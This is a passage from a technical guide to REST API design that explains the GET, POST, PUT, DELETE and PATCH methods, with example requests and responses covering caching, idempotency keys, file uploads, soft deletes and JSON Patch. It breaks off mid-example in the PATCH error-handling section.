GET /items?cursor=eyJpZCI6MTIzfQ&limit=20
```

**Field Selection:**

```
GET /users/123?fields=id,name,email
GET /products?fields=id,title,price&exclude=description,reviews
```

**Partial Representations:**

```
GET /users?embed=orders,preferences
GET /articles?expand=author,comments
```

**Search:**

```
GET /products?q=laptop&search_fields=title,description
GET /users?name_contains=john
```

**Query String Limitations**

URLs have practical length limits—browsers typically support 2,000-8,000 characters, though HTTP specifications don't mandate limits. Servers and proxies may impose their own restrictions. Complex filtering or large parameter sets can exceed these limits.

Query parameters appear in browser history, server logs, and referrer headers, creating privacy concerns for sensitive data. Avoid passing authentication tokens, personally identifiable information, or confidential data in query strings.

Special characters require URL encoding. Spaces become `%20` or `+`, ampersands become `%26`, and so on. This encoding increases URL length and complicates debugging.

**Caching Behavior**

GET responses are cacheable by default unless explicitly prohibited. Cache-Control headers govern caching:

```
Cache-Control: public, max-age=3600
Cache-Control: private, max-age=300
Cache-Control: no-cache
Cache-Control: no-store
```

Vary headers ensure caches store separate entries for different request characteristics:

```
Vary: Accept, Accept-Encoding, Accept-Language
```

Conditional GET requests using If-None-Match (with ETags) or If-Modified-Since (with timestamps) enable efficient cache validation:

```
GET /users/123
If-None-Match: "686897696a7c876b7e"

HTTP/1.1 304 Not Modified
ETag: "686897696a7c876b7e"
Cache-Control: max-age=300
```

Aggressive caching dramatically reduces server load and improves response times. Design APIs to maximize cacheability—use appropriate expiration times, implement ETags, and structure URLs to enable effective caching.

**Security Considerations**

GET requests expose all parameters in URLs. Proxies, load balancers, and intermediaries log complete URLs. Sensitive information in URLs persists in logs, browser history, and analytics systems.

Never authenticate using query parameters like `?token=abc123`. Use Authorization headers instead. Query parameter authentication creates numerous vulnerabilities—tokens appear in logs, get shared in URLs, and lack the protection HTTP headers provide.

GET requests enable Cross-Site Request Forgery (CSRF) when they trigger state changes. This is why GET must remain safe—browsers and intermediaries can preload, prefetch, and follow links automatically without user consent.

**Range Requests**

HTTP Range headers enable partial resource retrieval:

```
GET /videos/movie.mp4
Range: bytes=0-1023

HTTP/1.1 206 Partial Content
Content-Range: bytes 0-1023/10485760
Content-Length: 1024
```

Range requests support:

- Resumable downloads after connection failures
- Progressive media streaming
- Efficient access to large files when only portions are needed
- Parallel chunk downloads for faster transfers

Servers indicate Range support using Accept-Ranges header:

```
Accept-Ranges: bytes
Accept-Ranges: none
```

**Conditional GET Optimization**

Beyond basic caching, conditional GETs enable sophisticated optimization patterns:

**If-None-Match with ETags:**

```
GET /api/data
If-None-Match: "v1", "v2", "v3"

HTTP/1.1 304 Not Modified
ETag: "v2"
```

Clients can provide multiple ETags, and servers return 304 if any match.

**If-Modified-Since:**

```
GET /api/data
If-Modified-Since: Mon, 15 Jan 2024 10:00:00 GMT

HTTP/1.1 304 Not Modified
Last-Modified: Mon, 15 Jan 2024 09:45:00 GMT
```

Combining both provides robust validation:

```
GET /api/data
If-None-Match: "abc123"
If-Modified-Since: Mon, 15 Jan 2024 10:00:00 GMT
```

Servers prioritize If-None-Match when both are present.

**Collection Retrieval Patterns**

Collections present unique challenges. Large collections require pagination to prevent overwhelming clients and servers.

**Complete Small Collections:**

```
GET /users/123/preferences

{
  "theme": "dark",
  "language": "en",
  "notifications": true
}
```

Simple collections can return all items when counts remain manageable (typically under 100 items).

**Paginated Collections:**

```
GET /users?page=1&per_page=20

{
  "items": [...],
  "page": 1,
  "per_page": 20,
  "total": 1543,
  "total_pages": 78
}
```

**Cursored Collections:**

```
GET /posts?cursor=abc123&limit=20

{
  "items": [...],
  "next_cursor": "def456",
  "has_more": true
}
```

**Sparse Collections with Filtering:**

```
GET /users?status=active&role=admin&department=engineering

{
  "items": [...],
  "matched": 47,
  "filters_applied": {
    "status": "active",
    "role": "admin",
    "department": "engineering"
  }
}
```

### POST

**Primary Purpose** POST submits data to servers for processing. Unlike other methods with specific semantics, POST serves multiple purposes—resource creation, complex operations that don't fit other methods, and actions that exceed GET's URI length limits.

**Characteristics**

POST is neither safe nor idempotent. Each POST request potentially creates new resources or triggers distinct operations. Repeated identical POST requests typically create multiple resources or execute actions multiple times.

This lack of idempotency creates challenges for retry logic. Network timeouts leave uncertainty—did the request succeed? Retrying may create duplicates. Idempotency-Key headers address this problem (discussed below).

**Resource Creation**

POST commonly creates new resources. Clients POST to collection URIs, and servers assign identifiers:

```
POST /users
Content-Type: application/json

{
  "name": "Jane Doe",
  "email": "jane@example.com"
}

HTTP/1.1 201 Created
Location: /users/456
Content-Type: application/json

{
  "id": 456,
  "name": "Jane Doe",
  "email": "jane@example.com",
  "created_at": "2024-12-16T10:30:00Z"
}
```

201 Created indicates success. The Location header provides the URI for the newly created resource. Response bodies typically include the complete resource representation, including server-generated fields (IDs, timestamps, defaults).

**Creation Response Patterns**

**Full Resource in Response:** Most common—return the complete created resource. Clients receive server-generated values immediately without additional GET requests.

**Minimal Response:**

```
HTTP/1.1 201 Created
Location: /users/456
```

Return only Location header with 201. Reduces response size and server processing. Clients must GET the resource if they need details.

**Async Creation:**

```
HTTP/1.1 202 Accepted
Location: /operations/abc-123
Content-Type: application/json

{
  "operation_id": "abc-123",
  "status": "processing",
  "status_url": "/operations/abc-123"
}
```

202 Accepted indicates the request was accepted but processing isn't complete. Return operation identifier and status endpoint for polling.

**Response Codes**

- 201 Created: Resource successfully created
- 202 Accepted: Request accepted for processing but not completed
- 200 OK: Request processed successfully but didn't create a distinct resource (used when POST triggers calculations, searches, or operations)
- 400 Bad Request: Invalid request data, validation failures
- 401 Unauthorized: Authentication required
- 403 Forbidden: Authenticated but lacks create permission
- 409 Conflict: Resource already exists or violates uniqueness constraints
- 413 Payload Too Large: Request body exceeds size limits
- 415 Unsupported Media Type: Content-Type not supported
- 422 Unprocessable Entity: Syntactically valid but semantically invalid

**Request Body Formats**

**JSON (application/json):**

```
POST /articles
Content-Type: application/json

{
  "title": "Understanding REST",
  "content": "...",
  "tags": ["rest", "api", "http"],
  "published": true
}
```

JSON is the dominant format for REST APIs. Supports complex nested structures, arrays, and various data types. Human-readable and widely supported across languages.

**Form Data (application/x-www-form-urlencoded):**

```
POST /login
Content-Type: application/x-www-form-urlencoded

username=user&password=pass123&remember=true
```

Traditional HTML form encoding. Key-value pairs separated by ampersands. Special characters URL-encoded. Flat structure—no native support for nested objects or arrays. Primarily used for simple forms and legacy compatibility.

**Multipart (multipart/form-data):**

```
POST /uploads
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="title"

Document Title
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="document.pdf"
Content-Type: application/pdf

[binary file content]
------WebKitFormBoundary--
```

Enables file uploads mixed with other form fields. Each part has its own headers and content type. Required for binary file uploads. More verbose than other formats.

**XML (application/xml):**

```
POST /orders
Content-Type: application/xml

<?xml version="1.0"?>
<order>
  <customer_id>123</customer_id>
  <items>
    <item>
      <product_id>789</product_id>
      <quantity>2</quantity>
    </item>
  </items>
</order>
```

Less common in modern REST APIs but still used in enterprise and legacy systems. More verbose than JSON. Supports schemas for validation (XSD).

**Non-Resource-Creation Uses**

**Complex Queries:** When query complexity exceeds URI length limits, POST can carry search criteria in the request body:

```
POST /users/search
Content-Type: application/json

{
  "filters": {
    "age": {"min": 25, "max": 40},
    "location": {"city": "New York", "radius": 50},
    "interests": ["technology", "music", "travel"]
  },
  "sort": ["-created_at", "name"],
  "page": 1,
  "per_page": 20
}
```

This violates REST principles (GET should retrieve resources), but practical considerations sometimes outweigh purity. Mark endpoints clearly as searches to avoid confusion.

**Operations and Actions:** POST handles operations that don't map to simple CRUD:

```
POST /invoices/123/send
Content-Type: application/json

{
  "recipient": "customer@example.com",
  "include_attachments": true
}

HTTP/1.1 200 OK
Content-Type: application/json

{
  "sent_at": "2024-12-16T10:35:00Z",
  "message_id": "msg_abc123"
}
```

Action-oriented endpoints use verbs in URIs, which conflicts with resource-oriented REST design. However, some operations don't fit resource metaphors. Controllers or actions provide pragmatic solutions.

**Batch Operations:**

```
POST /batch
Content-Type: application/json

{
  "operations": [
    {"method": "POST", "path": "/users", "body": {"name": "Alice"}},
    {"method": "PUT", "path": "/users/123", "body": {"name": "Bob"}},
    {"method": "DELETE", "path": "/users/456"}
  ]
}

HTTP/1.1 200 OK
Content-Type: application/json

{
  "results": [
    {"status": 201, "body": {"id": 789, "name": "Alice"}},
    {"status": 200, "body": {"id": 123, "name": "Bob"}},
    {"status": 204}
  ]
}
```

Batch endpoints reduce round-trips by executing multiple operations in one request. Particularly valuable for mobile or high-latency networks.

**Idempotency Keys**

POST's non-idempotent nature creates problems for retry logic. Idempotency-Key headers enable safe retries:

```
POST /payments
Idempotency-Key: 550e8400-e29b-41d4-a716-446655440000
Content-Type: application/json

{
  "amount": 100.00,
  "currency": "USD",
  "source": "card_123"
}
```

Servers track idempotency keys (typically for 24 hours). Duplicate requests with the same key return the original response without re-executing. Clients generate unique keys (UUIDs) per logical operation.

Implementation considerations:

- Store key-response pairs with expiration
- Hash request bodies to detect key reuse with different data
- Return appropriate errors for mismatched bodies with same key
- Document key lifetime and storage guarantees

This pattern is particularly critical for financial transactions, order creation, and other operations where duplicates cause significant problems.

**File Upload Patterns**

**Direct Upload:**

```
POST /files
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="photo.jpg"
Content-Type: image/jpeg

[binary content]
------Boundary--

HTTP/1.1 201 Created
Location: /files/abc123

{
  "id": "abc123",
  "filename": "photo.jpg",
  "size": 2048576,
  "content_type": "image/jpeg",
  "url": "https://cdn.example.com/files/abc123"
}
```

Simple but server processes uploads directly. Large files consume server resources and bandwidth.

**Presigned URL Pattern:**

```
POST /files/upload-url
Content-Type: application/json

{
  "filename": "photo.jpg",
  "content_type": "image/jpeg",
  "size": 2048576
}

HTTP/1.1 200 OK

{
  "upload_url": "https://storage.example.com/presigned?token=xyz",
  "file_id": "abc123",
  "expires_at": "2024-12-16T11:30:00Z"
}
```

Server returns presigned URL. Client uploads directly to storage service (S3, Cloud Storage). Reduces server load and bandwidth. After upload completes, client may notify original API.

**Chunked Upload:** For very large files, upload in chunks:

```
POST /files
Content-Type: application/json

{
  "filename": "video.mp4",
  "size": 524288000,
  "chunk_size": 5242880
}

HTTP/1.1 201 Created

{
  "upload_id": "upload_xyz",
  "chunk_urls": [
    "/files/upload_xyz/chunks/0",
    "/files/upload_xyz/chunks/1",
    ...
  ]
}
```

Client PUTs each chunk to corresponding URL. After all chunks upload, finalize:

```
POST /files/upload_xyz/complete

HTTP/1.1 200 OK

{
  "file_id": "file_abc123",
  "url": "https://cdn.example.com/files/abc123"
}
```

Enables resumable uploads, parallel chunk uploading, and handles network interruptions gracefully.

**POST vs PUT for Creation**

POST to collections, servers assign URIs:

```
POST /users → creates /users/456
```

PUT to specific URIs, clients specify complete URI:

```
PUT /users/456 → creates /users/456
```

Use POST when:

- Server generates identifiers
- Creating resources within collections
- URI structure is server-controlled
- Multiple POSTs should create multiple resources

Use PUT when:

- Client controls the complete URI
- Creating resources at predetermined locations
- URI represents the resource completely
- Idempotency is required

### PUT

**Primary Purpose** PUT replaces entire resources at specific URIs. It provides complete resource representations, and servers replace existing resources entirely.

**Characteristics**

PUT is idempotent—executing the same PUT request multiple times produces identical results. The first PUT may create or replace a resource; subsequent identical PUTs leave the resource unchanged. This idempotency enables safe retries without concern for side effects.

PUT is not safe—it modifies server state by replacing resources.

**Complete Replacement Semantics**

PUT requires complete resource representations. Clients must include all fields, even unchanged ones:

```
PUT /users/123
Content-Type: application/json

{
  "id": 123,
  "name": "Jane Smith",
  "email": "jane.smith@example.com",
  "phone": "+1-555-0100",
  "address": {
    "street": "123 Main St",
    "city": "New York",
    "country": "US"
  },
  "preferences": {
    "theme": "dark",
    "language": "en"
  }
}

HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 123,
  "name": "Jane Smith",
  "email": "jane.smith@example.com",
  "phone": "+1-555-0100",
  "address": {
    "street": "123 Main St",
    "city": "New York",
    "country": "US"
  },
  "preferences": {
    "theme": "dark",
    "language": "en"
  },
  "updated_at": "2024-12-16T10:40:00Z"
}
```

Omitted fields are removed or reset to defaults. If the client PUTs without including `phone`, the server removes the phone number. This behavior distinguishes PUT from PATCH.

**Response Codes**

- 200 OK: Resource successfully replaced, response includes updated representation
- 204 No Content: Resource successfully replaced, no response body
- 201 Created: Resource didn't exist and was created (when servers allow PUT to create resources)
- 400 Bad Request: Invalid request data or validation failures
- 401 Unauthorized: Authentication required
- 403 Forbidden: Authenticated but lacks update permission
- 404 Not Found: Resource doesn't exist (when servers don't allow PUT to create resources)
- 409 Conflict: Request conflicts with current state (often with concurrent modifications)
- 412 Precondition Failed: Conditional PUT failed (If-Match, If-Unmodified-Since)
- 413 Payload Too Large: Request body exceeds limits
- 415 Unsupported Media Type: Content-Type not supported
- 422 Unprocessable Entity: Syntactically valid but semantically invalid

**Resource Creation with PUT**

Some APIs allow PUT to create resources when they don't exist:

```
PUT /users/new-user-456
Content-Type: application/json

{
  "id": "new-user-456",
  "name": "John Doe",
  "email": "john@example.com"
}

HTTP/1.1 201 Created
Location: /users/new-user-456
Content-Type: application/json

{
  "id": "new-user-456",
  "name": "John Doe",
  "email": "john@example.com",
  "created_at": "2024-12-16T10:45:00Z"
}
```

This pattern works when clients control URIs completely. More commonly, servers generate identifiers and PUT only updates existing resources.

**Idempotency Implementation**

PUT's idempotency stems from its replacement semantics. Given a specific resource state and PUT request, the outcome is deterministic:

```
PUT /users/123 with {"name": "Alice", "email": "alice@example.com"}
```

Whether executed once or one hundred times, the resource ends in the same state: name is "Alice", email is "alice@example.com".

However, server-controlled fields complicate matters. Timestamps like `updated_at` change with each PUT. Counters, version numbers, or audit logs may increment. Strict idempotency means resource state is identical; practical idempotency means the resource represents the same logical state despite metadata changes.

External side effects also affect idempotency. If PUT triggers emails, webhook notifications, or third-party API calls, repeated PUTs generate duplicate actions. [Inference] Truly idempotent implementations should detect duplicate PUTs and skip side effects, though this requires tracking recent requests or using idempotency keys.

**Conditional PUT with Optimistic Locking**

Conditional requests prevent concurrent modification conflicts. Clients include If-Match headers with ETags retrieved from previous GETs:

```
GET /users/123

HTTP/1.1 200 OK
ETag: "v1"

{
  "id": 123,
  "name": "Alice",
  "email": "alice@example.com"
}
```

Later, the client PUTs an update with the ETag:

```
PUT /users/123
If-Match: "v1"
Content-Type: application/json

{
  "id": 123,
  "name": "Alice Updated",
  "email": "alice@example.com"
}
```

If the resource changed since the GET (ETag no longer matches), the server returns 412 Precondition Failed:

```
HTTP/1.1 412 Precondition Failed
ETag: "v2"

{
  "error": "Resource was modified by another client"
}
```

Client must GET the current state, merge changes, and retry the PUT with the new ETag.

If the ETag matches, the server processes the PUT:

```
HTTP/1.1 200 OK
ETag: "v3"

{
  "id": 123,
  "name": "Alice Updated",
  "email": "alice@example.com",
  "updated_at": "2024-12-16T10:50:00Z"
}
```

**If-Unmodified-Since** provides timestamp-based conditional requests:

```
PUT /users/123
If-Unmodified-Since: Mon, 16 Dec 2024 10:00:00 GMT
```

Servers compare Last-Modified against If-Unmodified-Since. If the resource was modified after the specified time, return 412.

**Partial Updates and PUT**

PUT's complete replacement semantics create problems for partial updates. Clients must retrieve the full resource, modify desired fields, and PUT the complete representation:

```
GET /users/123

{
  "id": 123,
  "name": "Alice",
  "email": "alice@example.com",
  "phone": "+1-555-0100",
  "address": {...},
  "preferences": {...}
}
```

To change only the email:

```
PUT /users/123

{
  "id": 123,
  "name": "Alice",
  "email": "newemail@example.com",
  "phone": "+1-555-0100",
  "address": {...},
  "preferences": {...}
}
```

This approach wastes bandwidth and creates race conditions. While client A reads the resource, client B might modify it. Client A's PUT then overwrites client B's changes.

PATCH solves this problem by supporting partial updates.

**PUT for Non-Resource Operations**

While PUT typically updates resources, some APIs use PUT for idempotent operations:

```
PUT /cache/keys/session_123
Content-Type: application/json

{
  "data": {"user_id": 456, "expires": 3600},
  "ttl": 3600
}
```

Setting cache keys, configuration values, or other idempotent settings fits PUT semantics.

**Caching Considerations**

PUT requests are not cacheable—responses don't provide reusable data for future requests. However, successful PUTs invalidate cached GET responses for the same URI. Caches must discard stale entries.

Servers can include Cache-Control headers in PUT responses if returning resource representations, affecting subsequent GET requests:

```
PUT /users/123

HTTP/1.1 200 OK
ETag: "v3"
Cache-Control: max-age=300

{...}
```

### DELETE

**Primary Purpose** DELETE removes resources from servers. It instructs servers to delete the resource identified by the URI.

**Characteristics**

DELETE is idempotent—deleting a resource multiple times produces the same result. The first DELETE removes the resource; subsequent DELETEs find the resource already gone. The end state is identical.

DELETE is not safe—it modifies server state by removing resources.

**Basic Usage**

```
DELETE /users/123

HTTP/1.1 204 No Content
```

Most DELETE operations return 204 No Content—the operation succeeded but there's no representation to return.

Alternatively, return 200 OK with a response body:

```
DELETE /users/123

HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "User successfully deleted",
  "deleted_at": "2024-12-16T11:00:00Z"
}
```

**Response Codes**

- 204 No Content: Resource successfully deleted, no response body
- 200 OK: Resource successfully deleted with response body
- 202 Accepted: Deletion request accepted but not completed (asynchronous deletion)
- 404 Not Found: Resource doesn't exist (some APIs return 404, others return 204 for idempotency)
- 401 Unauthorized: Authentication required
- 403 Forbidden: Authenticated but lacks delete permission
- 409 Conflict: Resource cannot be deleted due to dependencies or constraints
- 410 Gone: Resource was already deleted

**Idempotency and 404 vs 204**

DELETE idempotency creates a design choice: should deleting a non-existent resource return 404 or 204?

**Return 204 for idempotency:**

```
DELETE /users/999

HTTP/1.1 204 No Content
```

This approach emphasizes idempotency. Whether the resource existed or not, the desired end state is achieved—the resource doesn't exist. Clients don't need to check existence before deleting. Retry logic remains simple.

**Return 404 for accuracy:**

```
DELETE /users/999

HTTP/1.1 404 Not Found

{
  "error": "User not found"
}
```

This approach provides explicit feedback. Clients know whether deletion succeeded or the resource never existed. Useful for detecting errors in client logic (wrong ID, race conditions).

**Return 410 Gone for previously-deleted:**

```
DELETE /users/999

HTTP/1.1 410 Gone

{
  "error": "User was already deleted",
  "deleted_at": "2024-12-15T14:30:00Z"
}
```

410 Gone indicates the resource previously existed but is permanently unavailable. This provides more information than 404 while maintaining idempotency—repeated DELETEs still return 410.

[Inference] The choice depends on API design philosophy. Strict REST interpretation favors 204 for idempotency. Practical implementations often prefer 404 or 410 for clarity.

**Soft Deletes**

Many applications implement soft deletes—marking resources as deleted without removing data:

```
DELETE /users/123

HTTP/1.1 204 No Content
```

Backend marks the user as deleted but preserves the record:

```json
{
  "id": 123,
  "name": "Alice",
  "email": "alice@example.com",
  "deleted": true,
  "deleted_at": "2024-12-16T11:05:00Z"
}
```

Subsequent GET requests return 404 or 410:

```
GET /users/123

HTTP/1.1 404 Not Found
```

Soft deletes enable:

- Audit trails and compliance (retaining historical records)
- Undo functionality (restore deleted resources)
- Referential integrity (preserving foreign key relationships)
- Analytics on deleted resources

To permanently delete (hard delete):

```
DELETE /users/123?permanent=true
```

Or provide separate endpoints:

```
DELETE /users/123/permanent
```

**Cascade Deletes and Dependencies**

Deleting resources with dependencies raises questions:

```
DELETE /users/123
```

Should this delete the user's orders, comments, uploaded files? Should it fail if dependencies exist?

**Return 409 Conflict when dependencies exist:**

```
DELETE /users/123

HTTP/1.1 409 Conflict

{
  "error": "Cannot delete user with existing orders",
  "dependencies": {
    "orders": 15,
    "comments": 47
  }
}
```

Require clients to explicitly handle dependencies first.

**Cascade delete with confirmation:**

```
DELETE /users/123?cascade=true
```

Query parameter or header indicates cascade should occur.

**Return details about cascaded deletes:**

```
DELETE /users/123?cascade=true

HTTP/1.1 200 OK

{
  "deleted": {
    "users": 1,
    "orders": 15,
    "comments": 47,
    "files": 3
  }
}
```

**Transfer ownership rather than delete:** Some resources shouldn't be deleted with their owners. Comments might transfer to [deleted] users. Files might move to an archive account.

**Asynchronous Deletion**

Large-scale deletions or complex cascade operations may require asynchronous processing:

```
DELETE /users/123

HTTP/1.1 202 Accepted
Location: /operations/del_abc123

{
  "operation_id": "del_abc123",
  "status": "pending",
  "status_url": "/operations/del_abc123"
}
```

Client polls the status endpoint:

```
GET /operations/del_abc123

HTTP/1.1 200 OK

{
  "operation_id": "del_abc123",
  "status": "in_progress",
  "started_at": "2024-12-16T11:05:00Z",
  "estimated_completion": "2024-12-16T11:10:00Z"
}
```

Eventually:

```
GET /operations/del_abc123

HTTP/1.1 200 OK

{
  "operation_id": "del_abc123",
  "status": "completed",
  "started_at": "2024-12-16T11:05:00Z",
  "completed_at": "2024-12-16T11:08:00Z",
  "deleted": {
    "users": 1,
    "related_records": 234
  }
}
```

**Bulk Deletes**

Deleting multiple resources individually is inefficient:

```
DELETE /users/123
DELETE /users/124
DELETE /users/125
...
```

Bulk delete options:

**Query parameter approach:**

```
DELETE /users?ids=123,124,125

HTTP/1.1 200 OK

{
  "deleted": 3,
  "ids": [123, 124, 125]
}
```

**Request body approach:**

```
DELETE /users
Content-Type: application/json

{
  "ids": [123, 124, 125]
}

HTTP/1.1 200 OK

{
  "deleted": 3, 
  "failed": 0, 
  "results": [
	  {"id": 123, "status": "deleted"},
	  {"id": 124, "status": "deleted"}, 
	  {"id": 125, "status": "deleted"} 
  ]
}
```

Note: Including request bodies in DELETE requests is controversial. HTTP specifications don't prohibit it, but many client libraries and intermediaries handle DELETE bodies inconsistently. Some implementations use POST to `/users/bulk-delete` instead.

**Filter-based deletion:**
```

DELETE /users?status=inactive&last_login_before=2023-01-01

HTTP/1.1 200 OK

{ "deleted": 1247, "filter": { "status": "inactive", "last_login_before": "2023-01-01" } }

```

Filter-based deletes are powerful but dangerous. Require confirmation, implement safeguards, and log extensively.

**Conditional Deletes**

Like PUT, DELETE supports conditional requests:

```

DELETE /users/123 If-Match: "v5"

HTTP/1.1 204 No Content

```

If the resource changed (ETag doesn't match), return 412:

```

DELETE /users/123 If-Match: "v5"

HTTP/1.1 412 Precondition Failed ETag: "v6"

{ "error": "Resource was modified" }

```

This prevents accidental deletion of updated resources.

**Restoring Deleted Resources**

APIs implementing soft deletes might provide restoration:

```

POST /users/123/restore

HTTP/1.1 200 OK

{ "id": 123, "name": "Alice", "email": "alice@example.com", "deleted": false, "restored_at": "2024-12-16T11:15:00Z" }

```

Or use PUT with a specific state:

```

PUT /users/123 Content-Type: application/json

{ "deleted": false }

HTTP/1.1 200 OK

```

**Security Considerations**

DELETE operations require careful authorization. Verify not just that users are authenticated, but that they have permission to delete specific resources.

Common patterns:
- Users can delete only their own resources
- Admins can delete any resources
- Resources can be deleted only by their owners or assigned users
- Some resources cannot be deleted, only archived

Rate limit DELETE operations more aggressively than reads. Bulk deletes especially warrant strict limits and additional authentication requirements.

Log all deletion operations comprehensively. Include who deleted what, when, and from what IP address. This audit trail is crucial for security investigations and compliance.

### PATCH

**Primary Purpose**
PATCH applies partial modifications to resources. Unlike PUT, which replaces entire resources, PATCH updates only specified fields.

**Characteristics**

PATCH is not inherently idempotent—repeated PATCH requests may produce different results depending on the patch format. However, specific patch formats can be designed for idempotency.

PATCH is not safe—it modifies resource state.

**Partial Update Semantics**

PATCH sends only changed fields:

```

PATCH /users/123 Content-Type: application/json

{ "email": "newemail@example.com" }

HTTP/1.1 200 OK

{ "id": 123, "name": "Alice", "email": "newemail@example.com", "phone": "+1-555-0100", "updated_at": "2024-12-16T11:20:00Z" }

```

Only `email` changes; other fields remain untouched. This solves the bandwidth and race condition problems with PUT.

**Response Codes**
- 200 OK: Resource successfully updated, includes updated representation
- 204 No Content: Resource successfully updated, no response body
- 400 Bad Request: Invalid patch document or validation failures
- 401 Unauthorized: Authentication required
- 403 Forbidden: Authenticated but lacks update permission
- 404 Not Found: Resource doesn't exist
- 409 Conflict: Patch conflicts with current resource state
- 412 Precondition Failed: Conditional PATCH failed
- 415 Unsupported Media Type: Patch format not supported
- 422 Unprocessable Entity: Patch is valid but cannot be applied

**Simple JSON Merge Patch (RFC 7396)**

The simplest PATCH format uses JSON Merge Patch:

```

PATCH /users/123 Content-Type: application/merge-patch+json

{ "email": "updated@example.com", "phone": null }

```

Fields in the patch replace corresponding fields in the resource. `null` values delete fields. Missing fields remain unchanged.

**Advantages:**
- Simple to understand and implement
- Minimal overhead
- Natural JSON syntax

**Limitations:**
- Cannot distinguish between setting a field to `null` and deleting it
- Cannot append to arrays, only replace them entirely
- Cannot perform conditional updates
- No way to test current values before applying changes

**JSON Patch (RFC 6902)**

JSON Patch provides more sophisticated operations:

```

PATCH /users/123 Content-Type: application/json-patch+json

[ {"op": "replace", "path": "/email", "value": "updated@example.com"}, {"op": "remove", "path": "/phone"}, {"op": "add", "path": "/preferences/notifications", "value": true} ]

````

**Operations:**

**Add:**
```json
{"op": "add", "path": "/tags/0", "value": "important"}
````

Adds value at path. For arrays, inserts at specified index. For objects, sets the field.

**Remove:**

```json
{"op": "remove", "path": "/deprecated_field"}
```

Removes the value at path.

**Replace:**

```json
{"op": "replace", "path": "/status", "value": "active"}
```

Replaces value at path. Fails if path doesn't exist.

**Move:**

```json
{"op": "move", "from": "/old_location", "path": "/new_location"}
```

Moves value from one path to another.

**Copy:**

```json
{"op": "copy", "from": "/template", "path": "/new_instance"}
```

Copies value from one path to another.

**Test:**

```json
{"op": "test", "path": "/version", "value": 5}
```

Verifies value at path matches the specified value. Fails the entire patch if test fails. Enables conditional updates.

**JSON Patch Example—Conditional Update:**

```
PATCH /users/123
Content-Type: application/json-patch+json

[
  {"op": "test", "path": "/status", "value": "pending"},
  {"op": "replace", "path": "/status", "value": "approved"},
  {"op": "add", "path": "/approved_at", "value": "2024-12-16T11:25:00Z"}
]
```

This patch succeeds only if status is currently "pending". If the test fails, the entire patch is rejected, maintaining atomicity.

**Advantages of JSON Patch:**

- Precise control over modifications
- Array manipulation (insert, append, reorder)
- Conditional updates via test operations
- Atomic patches—all operations succeed or all fail
- Clear semantics for each operation

**Disadvantages:**

- More complex than merge patch
- Verbose for simple updates
- Requires understanding of JSON Pointer syntax (RFC 6901)
- Less intuitive for developers unfamiliar with the standard

**Custom Patch Formats**

Some APIs implement custom patch formats optimized for their domain:

```
PATCH /users/123
Content-Type: application/json

{
  "operations": [
    {"field": "email", "action": "set", "value": "new@example.com"},
    {"field": "tags", "action": "append", "value": "premium"},
    {"field": "metadata.last_login", "action": "set", "value": "2024-12-16T11:00:00Z"}
  ]
}
```

Custom formats provide domain-specific operations but sacrifice standardization and require custom client implementations.

**Idempotency Considerations**

Simple merge patches with absolute values are idempotent:

```
PATCH /users/123
Content-Type: application/merge-patch+json

{
  "status": "active",
  "email": "fixed@example.com"
}
```

Repeated identical patches produce the same result.

Relative operations are not idempotent:

```
PATCH /users/123
Content-Type: application/json

{
  "balance": "+10.00"
}
```

Each application increments balance by 10. Repeated patches keep increasing the value.

[Inference] To make relative operations idempotent, use idempotency keys or include version checks:

```
PATCH /users/123
If-Match: "v7"
Content-Type: application/json

{
  "balance": "+10.00"
}
```

**Nested Object Updates**

PATCH handles nested structures naturally:

**Merge patch replaces entire nested objects:**

```
PATCH /users/123
Content-Type: application/merge-patch+json

{
  "preferences": {
    "theme": "dark"
  }
}
```

This replaces the entire `preferences` object with `{"theme": "dark"}`, removing any other preference fields.

**JSON Patch updates specific nested fields:**

```
PATCH /users/123
Content-Type: application/json-patch+json

[
  {"op": "replace", "path": "/preferences/theme", "value": "dark"}
]
```

This changes only `/preferences/theme`, leaving other preference fields intact.

**Array Modifications**

**Merge patch replaces entire arrays:**

```
PATCH /users/123
Content-Type: application/merge-patch+json

{
  "tags": ["premium", "verified"]
}
```

Replaces the tags array completely.

**JSON Patch manipulates array elements:**

Add to end:

```json
[
  {"op": "add", "path": "/tags/-", "value": "new-tag"}
]
```

Insert at position:

```json
[
  {"op": "add", "path": "/tags/0", "value": "first-tag"}
]
```

Remove specific element:

```json
[
  {"op": "remove", "path": "/tags/2"}
]
```

Replace element:

```json
[
  {"op": "replace", "path": "/tags/1", "value": "updated-tag"}
]
```

**Validation and Constraints**

PATCH requests must still satisfy validation rules:

```
PATCH /users/123
Content-Type: application/merge-patch+json

{
  "email": "invalid-email"
}

HTTP/1.1 422 Unprocessable Entity

{
  "error": "Validation failed",
  "fields": {
    "email": ["Must be a valid email address"]
  }
}
```

Servers validate the resource state after applying patches, not just the patch itself.

**Conditional PATCH**

Like PUT and DELETE, PATCH supports conditional requests:

```
PATCH /users/123
If-Match: "v8"
Content-Type: application/merge-patch+json

{
  "status": "active"
}

HTTP/1.1 200 OK
ETag: "v9"

{
  "id": 123,
  "status": "active",
  "updated_at": "2024-12-16T11:30:00Z"
}
```

Conditional PATCH prevents lost updates when multiple clients modify the same resource.

**PATCH vs PUT Decision**

**Use PATCH when:**

- Updating only specific fields
- Large resources where sending complete representations wastes bandwidth
- High concurrency—partial updates reduce conflicts
- Resources have many optional fields
- Clients shouldn't know complete resource structure

**Use PUT when:**

- Complete resource replacement matches semantics
- Simplicity is valued over efficiency
- Resources are small
- Complete control over resource state is needed
- Idempotency is critical (PUT is inherently idempotent)

**NULL Handling Ambiguity**

Different interpretations of `null` create confusion:

**Interpretation 1—Set to null:**

```
PATCH /users/123

{
  "middle_name": null
}
```

Sets middle_name to null (representing "no middle name").

**Interpretation 2—Delete field:**

```
PATCH /users/123

{
  "middle_name": null
}
```

Removes the middle_name field entirely.

**Interpretation 3—Ignore:** Some implementations ignore null values, leaving fields unchanged.

JSON Merge Patch (RFC 7396) specifies that `null` deletes fields. However, this creates problems when the domain requires `null` as a value distinct from absent.

APIs should document null handling clearly. Consider using explicit operations for deletion:

```
PATCH /users/123

{
  "middle_name": {"$delete": true}
}
```

Or use JSON Patch for unambiguous semantics.

**Error Handling**

PATCH operations can fail partially or completely:

**Atomic failure—reject entire patch if any operation fails:**

```
PATCH /users/123
